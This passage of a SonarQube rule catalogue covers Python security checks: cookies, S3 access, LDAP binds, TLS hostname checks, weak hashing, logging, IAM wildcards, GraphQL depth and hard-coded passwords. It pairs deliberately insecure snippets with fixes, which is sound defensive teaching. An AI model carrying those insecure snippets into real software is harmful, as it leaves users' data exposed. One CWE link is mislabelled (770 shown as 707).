  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3330">
              python:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Flask:</p>
<pre>
from flask import Response

@app.route('/')
def index():
    response = Response()
    response.set_cookie('key', 'value') # Sensitive
    return response
</pre>
<h2>Compliant Solution</h2>
<p>Flask:</p>
<pre>
from flask import Response

@app.route('/')
def index():
    response = Response()
    response.set_cookie('key', 'value', httponly=True) # Compliant
    return response
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6281">
              python:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul>
  <li> <code>block_public_acls</code>: to block or not public ACLs to be set to the S3 bucket. </li>
  <li> <code>ignore_public_acls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>
  <li> <code>block_public_policy</code>: to block or not public policies to be set to the S3 bucket. </li>
  <li> <code>restrict_public_buckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li>
</ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>block_public_acls</code> and <code>ignore_public_acls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>block_public_access</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>
  <li> These settings are not already enforced to true at the account level. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul>
  <li> <code>block_public_acls</code> to <code>True</code> to block new attempts to set public ACLs. </li>
  <li> <code>ignore_public_acls</code> to <code>True</code> to block existing public ACLs. </li>
  <li> <code>block_public_policy</code> to <code>True</code> to block new attempts to set public policies. </li>
  <li> <code>restrict_public_buckets</code> to <code>True</code> to restrict existing public policies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>block_public_access</code> is fully deactivated (nothing is blocked):</p>
<pre>
bucket = s3.Bucket(self,
    "bucket"        # Sensitive
)
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
bucket = s3.Bucket(self,
    "bucket",
    block_public_access=s3.BlockPublicAccess(
        block_public_acls=False,       # Sensitive
        ignore_public_acls=True,
        block_public_policy=True,
        restrict_public_buckets=True
    )
)
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
bucket = s3.Bucket(self,
    "bucket",
    block_public_access=s3.BlockPublicAccess.BLOCK_ACLS     # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>This <code>block_public_access</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
bucket = s3.Bucket(self,
    "bucket",
    block_public_access=s3.BlockPublicAccess.BLOCK_ALL # Compliant
)
</pre>
<p>A similar configuration to the one above can obtained by setting all parameters of the <code>block_public_access</code></p>
<pre>
bucket = s3.Bucket(self, "bucket",
    block_public_access=s3.BlockPublicAccess(       # Compliant
        block_public_acls=True,
        ignore_public_acls=True,
        block_public_policy=True,
        restrict_public_buckets=True
    )
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_s3/Bucket.html">AWS CDK version 2</a> - Bucket </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2257">
              python:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>Argon2PasswordHasher</code>, <code>BCryptPasswordHasher</code>, …​ should be used instead.</p>
<p>This rule tracks creation of <code>BasePasswordHasher</code> subclasses for Django applications.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a standard algorithm instead of creating a custom one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
class CustomPasswordHasher(BasePasswordHasher):  # Sensitive
    # ...
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4433">
              python:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul>
  <li> <em>Anonymous</em> Authentication </li>
  <li> <em>Unauthenticated</em> Authentication </li>
  <li> <em>Name/Password</em> Authentication </li>
</ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ldap

def init_ldap():
   connect = ldap.initialize('ldap://example:1389')

   connect.simple_bind('cn=root') # Noncompliant
   connect.simple_bind_s('cn=root') # Noncompliant
   connect.bind_s('cn=root', None) # Noncompliant
   connect.bind('cn=root', None) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ldap
import os

def init_ldap():
   connect = ldap.initialize('ldap://example:1389')

   connect.simple_bind('cn=root', os.environ.get('LDAP_PASSWORD'))
   connect.simple_bind_s('cn=root', os.environ.get('LDAP_PASSWORD'))
   connect.bind_s('cn=root', os.environ.get('LDAP_PASSWORD'))
   connect.bind('cn=root', os.environ.get('LDAP_PASSWORD'))
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5527">
              python:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> or <code>_create_stdlib_context</code> is used. It is
recommended to use <code>create_default_context</code>, without explicitly setting <code>check_hostname</code> to <code>False</code>.<br> Doing so
creates a secure context that validates both hostnames and certificates.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ssl

example = ssl._create_stdlib_context() # Noncompliant

example = ssl._create_default_https_context()
example.check_hostname = False # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ssl

example = ssl.create_default_context()

example = ssl._create_default_https_context()
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4790">
              python:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
import hashlib
m = hashlib.md5() // Sensitive
</pre>
<pre>
import hashlib
m = hashlib.sha1() // Sensitive
</pre>
<pre>
import md5 // Sensitive and deprecated since Python 2.5; use the hashlib module instead.
m = md5.new()

import sha // Sensitive and deprecated since Python 2.5; use the hashlib module instead.
m = sha.new()
</pre>
<h2>Compliant Solution</h2>
<pre>
import hashlib
m = hashlib.sha512() // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4792">
              python:S4792
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn’t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import logging
from logging import Logger, Handler, Filter
from logging.config import fileConfig, dictConfig

logging.basicConfig()  # Sensitive

logging.disable()  # Sensitive


def update_logging(logger_class):
    logging.setLoggerClass(logger_class)  # Sensitive


def set_last_resort(last_resort):
    logging.lastResort = last_resort  # Sensitive


class CustomLogger(Logger):  # Sensitive
    pass


class CustomHandler(Handler):  # Sensitive
    pass


class CustomFilter(Filter):  # Sensitive
    pass


def update_config(path, config):
    fileConfig(path)  # Sensitive
    dictConfig(config)  # Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Information Exposure Through Log Files</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6304">
              python:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a
href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>"*"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements=[
        PolicyStatement(
            effect=Effect.ALLOW,
            actions="iam:CreatePolicyVersion",
            resources=["*"] # Sensitive
        )
    ]
)
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
from aws_cdk import Aws
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements=[
        PolicyStatement(
            effect=Effect.ALLOW,
            actions="iam:CreatePolicyVersion",
            resources=[f"arn:aws:iam::{Aws.ACCOUNT_ID}:policy/team1/*"]
        )
    ]
)
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>
  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6785">
              python:S6785
            </a>
          </td>
          <td>
            <details>
              <p>GraphQL servers are vulnerable to Denial of Service attacks when they fail to limit the depth of queries. In such a case, an attacker is able to
craft complex, deeply nested queries to make the application unwillingly consume an important amount of resources.</p>
<h2>Why is this an issue?</h2>
<p>When a server receives a deeply nested query, it attempts to resolve all the requested data. This process can consume a substantial amount of
computational resources, leading to a slowdown in server response times.</p>
<h3>What is the potential impact?</h3>
<p>A server that faces a resource exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed
and how well the hosting server configuration is hardened.</p>
<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect
the whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or
other sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>
<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where resource usage limits are in place, the
consequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on
running without perturbation. The vulnerable application will still stop working properly.</p>
<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are
business-critical.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from graphql_server.flask import GraphQLView

app.add_url_rule("/api",
    view_func=GraphQLView.as_view(  # Noncompliant
        name="api",
        schema=schema,
    )
)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from graphql_server.flask import GraphQLView
from graphene.validation import depth_limit_validator

app.add_url_rule("/api",
    view_func=GraphQLView.as_view(
        name="api",
        schema=schema,
        validation_rules=[
           depth_limit_validator(10) # Choose a value that fits your application's requirements
        ]
    )
)
</pre>
<h3>How does this work?</h3>
<h4>Avoid circular references</h4>
<p>A prerequisite for deeply nested query to be executed is the presence of circular references in the database schema. Avoid or minimize circular
references when designing the application’s database schema.</p>
<h4>Set limits</h4>
<p>Limit the depth of the queries your server will accept. By setting a maximum depth, you can ensure that excessively nested queries are rejected.
Remember, the values for maximum depth and complexity should be set according to your application’s specific needs. Setting these limits too low could
restrict legitimate queries, while setting them too high could leave your server vulnerable to attacks.</p>
<p>The easiest way to set such a limit is to use the query validation API available from Graphene 3. Applications running Graphene 2 should consider
upgrading to Graphene 3 to benefit from this API.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-707 - Allocation of Resources Without Limits or Throttling</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2068">
              python:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
username = 'admin'
password = 'admin' # Sensitive
usernamePassword = 'user=admin&amp;password=admin' # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import os

